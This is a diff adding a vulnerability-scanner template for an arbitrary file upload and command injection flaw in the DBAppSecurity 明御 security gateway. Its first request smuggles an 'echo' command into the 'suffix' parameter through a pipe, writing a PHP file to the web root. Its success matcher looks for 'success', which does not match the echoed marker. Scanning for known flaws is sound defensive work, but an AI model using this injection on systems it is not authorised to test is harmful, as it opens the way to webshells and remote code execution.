@@ -1,0 +1,33 @@
+id: dbappsecurity-gateway-upload
+
+info:
+  name: 安恒明御安全网关任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    目标系统允许通过特定接口上传任意文件，攻击者可利用此漏洞部署恶意代码（如WebShell）以实现远程代码执行。
+    日期: 2023-12-04
+  tags: 安恒明御安全网关
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.NTest.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+- raw:
+  - |
+    GET /webui/.NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
